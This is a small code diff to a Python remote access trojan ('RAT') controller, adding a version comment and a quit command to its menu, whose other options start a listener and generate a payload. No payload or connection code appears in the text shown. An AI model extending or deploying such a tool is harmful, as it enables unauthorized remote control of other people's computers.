@@ -1,3 +1,4 @@
+# Version 1.1 by Gabriel Barone
 from socket import socket, AF_INET, SOCK_STREAM
 import sys
 import os
@@ -36,7 +37,7 @@ class RAT:
    @@@@@                                   @@@@@''')
 
     def menu(self):
-        help_menu = {'Help':'Show this mensage', 'listen':'Start listener on determined port', 'gen':'Generates payload', 'clear':'Clears screen'}
+        help_menu = {'Help':'Show this mensage', 'listen':'Start listener on determined port', 'gen':'Generates payload', 'clear':'Clears screen', 'quit': 'Quits the program'}
         while 1:
             cmd = input('pirate@menu> ')
             if cmd == 'help':
@@ -62,7 +63,8 @@ class RAT:
                     self.listen()
                 except:
                     print('[-] Port must be a number!!')
-                
+            elif cmd == 'quit' or cmd == 'exit' or cmd == 'close':
+                exit()
             elif cmd == 'clear':
                 self.clear()
             elif cmd == '':
